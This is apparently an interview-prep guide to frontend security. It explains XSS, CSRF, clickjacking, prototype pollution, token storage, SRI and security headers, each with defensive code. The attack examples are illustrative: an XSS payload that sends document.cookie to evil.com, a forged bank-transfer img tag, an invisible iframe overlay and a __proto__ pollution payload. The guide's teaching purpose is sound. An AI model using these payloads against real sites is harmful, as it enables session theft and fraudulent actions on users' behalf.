# Frontend Security: A Senior Engineer's Guide

Security is not optional. Understanding attack vectors and defenses is essential for any production system.

---

## 1. XSS (Cross-Site Scripting)

The **most common** frontend vulnerability (~40% of reported vulnerabilities). Attacker injects malicious scripts into your page.

### Types of XSS

| Type | How It Works | Example |
|------|--------------|---------|
| **Stored XSS** | Malicious script saved in DB, served to all users | Comment: `<script>steal(cookies)</script>` |
| **Reflected XSS** | Script in URL, reflected in response | `site.com/search?q=<script>alert(1)</script>` |
| **DOM-based XSS** | Script manipulates DOM client-side | `innerHTML = location.hash` |

### Attack Example

```js
// User submits this as their "name"
const userName = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';

// Vulnerable code
document.getElementById('greeting').innerHTML = `Hello, ${userName}!`;

// Result: Attacker gets all cookies!
```

### Defense: Output Encoding

```js
// NEVER use innerHTML with user data
element.innerHTML = userInput;  // DANGEROUS

// Use textContent instead
element.textContent = userInput;  // SAFE - treats as text, not HTML

// Or sanitize HTML when you need rich content
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

### Defense: React's Automatic Escaping

```jsx
// React escapes by default - SAFE
<div>{userInput}</div>

// DANGEROUS - explicitly bypasses protection
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// If you must use it, sanitize first
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

### Defense: Content Security Policy (CSP)

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src *;
  connect-src 'self' https://api.myapp.com;
  frame-ancestors 'none';
```

| Directive | Purpose |
|-----------|---------|
| `default-src` | Fallback for all resource types |
| `script-src` | Where JS can load from |
| `style-src` | Where CSS can load from |
| `img-src` | Where images can load from |
| `connect-src` | Where fetch/XHR can connect |
| `frame-ancestors` | Who can embed this page (clickjacking prevention) |

### CSP: Nonces for Inline Scripts

```html
<!-- Server generates random nonce per request -->
<script nonce="random123abc">
  // This inline script is allowed
  console.log('Trusted inline code');
</script>

<!-- Header includes the nonce -->
Content-Security-Policy: script-src 'nonce-random123abc'

<!-- Attacker's injected script has no nonce = BLOCKED -->
<script>alert('XSS')</script>
```

### Defense: Trusted Types API

```js
// Force browser to block unsafe DOM manipulations
// Works in Chrome/Edge

// In CSP header:
Content-Security-Policy: require-trusted-types-for 'script'

// Now this throws an error:
element.innerHTML = userInput;  // TypeError!

// Must use a Trusted Type:
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (input) => DOMPurify.sanitize(input)
});

element.innerHTML = policy.createHTML(userInput);  // OK
```

---

## 2. CSRF (Cross-Site Request Forgery)

Attacker tricks user's browser into making authenticated requests to your site.

### The Attack

```
1. User logs into bank.com (session cookie set)
2. User visits evil.com
3. evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=10000">
4. Browser sends request WITH bank.com cookies automatically
5. Transfer happens without user's knowledge!
```

### Defense: SameSite Cookies

```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

| SameSite Value | Behavior |
|----------------|----------|
| `Strict` | Cookie NEVER sent on cross-site requests |
| `Lax` | Cookie sent on top-level navigations (links), not forms/images |
| `None` | Cookie always sent (must have `Secure` flag) |

### Defense: CSRF Tokens (Synchronizer Token Pattern)

```html
<!-- Server embeds unique token in form -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="abc123xyz">
  <input type="text" name="amount">
  <button type="submit">Transfer</button>
</form>
```

```js
// Server validates token matches session
if (request.body.csrf_token !== session.csrfToken) {
  return res.status(403).send('Invalid CSRF token');
}
```

### Defense: Double-Submit Cookie (For SPAs)

```js
// Server sets a random value in a cookie
Set-Cookie: XSRF-TOKEN=random123; Path=/

// Frontend reads it and sends in header
const token = document.cookie
  .split('; ')
  .find(row => row.startsWith('XSRF-TOKEN='))
  ?.split('=')[1];

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-XSRF-TOKEN': token  // Server compares cookie vs header
  }
});

// Attacker can't read our cookies, so can't forge the header!
```

---

## 3. Secure State & Storage Management

One of the most common senior-level mistakes is storing sensitive data insecurely.

### The Storage Hierarchy

| Storage | Security | Use For |
|---------|----------|---------|
| `localStorage` | Accessible to ANY JS (XSS vulnerable) | Non-sensitive preferences |
| `sessionStorage` | Same as localStorage, cleared on tab close | Temporary non-sensitive data |
| `HttpOnly Cookie` | NOT accessible to JS | Session tokens, auth tokens |
| `In-Memory` | Lost on refresh, safest from XSS | Short-lived access tokens |

### The Secure Token Pattern

```
┌──────────┐                              ┌──────────┐
│  Client  │                              │  Server  │
└────┬─────┘                              └────┬─────┘
     │                                         │
     │  Login: username/password               │
     │────────────────────────────────────────▶│
     │                                         │
     │  Access Token (15min) in JSON body      │
     │  Refresh Token in HttpOnly cookie       │
     │◀────────────────────────────────────────│
     │                                         │
     │  Store access token IN MEMORY ONLY      │
     │                                         │
     │  API calls with: Authorization: Bearer  │
     │────────────────────────────────────────▶│
     │                                         │
     │  Access token expired (401)             │
     │◀────────────────────────────────────────│
     │                                         │
     │  POST /refresh (HttpOnly cookie sent)   │
     │────────────────────────────────────────▶│
     │                                         │
     │  New access token in response body      │
     │◀────────────────────────────────────────│
```

**Why this pattern?**
- Access token in memory: XSS can't steal it from localStorage
- Refresh token in HttpOnly cookie: XSS can't read it
- Short-lived access token: Limits damage window if stolen

---

## 4. Clickjacking (UI Redressing)

Attacker overlays invisible iframe over legitimate content.

### The Attack

```html
<!-- On evil.com -->
<style>
  iframe {
    opacity: 0;
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
  }
</style>

<button>Click to win $1000!</button>
<iframe src="https://bank.com/transfer?to=attacker"></iframe>

<!-- User thinks they click button, actually clicks iframe -->
```

### Defense: X-Frame-Options

```http
X-Frame-Options: DENY              # Never allow framing
X-Frame-Options: SAMEORIGIN        # Only same origin can frame
```

### Defense: CSP frame-ancestors (Modern)

```http
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

---

## 5. Third-Party Supply Chain Attacks

Modern frontend apps have thousands of dependencies. If one package is compromised, your system is at risk.

### Defense: Subresource Integrity (SRI)

```html
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>
```

If the file's hash doesn't match, browser **refuses to execute**.

### Defense: Automated Auditing

```bash
# In CI/CD pipeline
npm audit --audit-level=high
# Fails build if high/critical vulnerabilities found
```

### Defense: Sandboxed Iframes for Third-Party Scripts

```html
<!-- Risky third-party script (e.g., ad tracker) -->
<iframe
  src="https://ads.example.com/tracker"
  sandbox="allow-scripts"
  style="display: none;">
</iframe>

<!-- sandbox restricts: -->
<!-- - No access to parent DOM -->
<!-- - No cookies from parent origin -->
<!-- - No form submission -->
<!-- - No top-level navigation -->
```

---

## 6. Prototype Pollution

A JavaScript-specific attack where attacker modifies `Object.prototype`.

### The Attack

```js
// Vulnerable merge function
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attacker sends JSON payload:
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);

// Now EVERY object has isAdmin: true!
const user = {};
console.log(user.isAdmin);  // true!
```

### Defense

```js
// Check for dangerous keys
function safeMerge(target, source) {
  for (let key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;  // Skip dangerous keys
    }
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = safeMerge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Or use Object.create(null) for prototype-less objects
const safeObject = Object.create(null);  // No prototype chain
```

---

## 7. Secrets Management

### Never Expose in Frontend Code

```js
// WRONG: Bundled into client JS, visible to anyone
const API_KEY = 'sk_live_abc123';
fetch(`https://api.stripe.com/charges?key=${API_KEY}`);

// RIGHT: Proxy through your server
fetch('/api/create-charge', { method: 'POST', body: data });

// Server adds the secret
app.post('/api/create-charge', (req, res) => {
  fetch('https://api.stripe.com/charges', {
    headers: { 'Authorization': `Bearer ${process.env.STRIPE_SECRET_KEY}` }
  });
});
```

### What's OK to Expose

```js
// Public/Publishable keys are DESIGNED for frontend
const STRIPE_PUBLISHABLE_KEY = 'pk_live_xyz';  // OK
const FIREBASE_API_KEY = 'AIzaSy...';  // OK (scoped by security rules)
const GOOGLE_MAPS_KEY = 'abc123';  // OK (restricted by HTTP referrer)
```

---

## 8. Secure Headers Checklist

```http
# Prevent XSS
Content-Security-Policy: default-src 'self'; script-src 'self'

# Prevent clickjacking
X-Frame-Options: DENY

# Prevent MIME sniffing
X-Content-Type-Options: nosniff

# Force HTTPS for 1 year
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Control Referer header
Referrer-Policy: strict-origin-when-cross-origin

# Limit browser features
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

---

## 9. Security Checklist Summary

| Priority | Action | Reason |
|----------|--------|--------|
| **Critical** | HTTPS Only | Protects data in transit (MitM attacks) |
| **Critical** | Sanitize & Validate | Never trust user input, URL params, or API data |
| **Critical** | CSP with nonces | Mitigates XSS by blocking inline scripts |
| **High** | HttpOnly cookies | Prevents XSS from stealing session tokens |
| **High** | SameSite=Strict cookies | Prevents CSRF attacks |
| **High** | No secrets in frontend | Use server-side proxy for sensitive API keys |
| **Medium** | SRI for CDN scripts | Prevents supply chain attacks |
| **Medium** | Automated dependency audits | Catches vulnerable packages early |

---

## 10. Interview Tip

> "I approach frontend security with defense in depth. For XSS, I use output encoding (textContent over innerHTML), React's automatic escaping, and strict CSP with nonces. For CSRF, I combine SameSite cookies with token validation. For authentication, I prefer short-lived access tokens in memory with refresh tokens in HttpOnly cookies — this limits XSS damage while maintaining usability. I always validate on the server (client validation is just UX), use SRI for CDN scripts, and ensure secure headers are set (HSTS, X-Frame-Options, CSP). For supply chain security, I integrate npm audit into CI/CD."
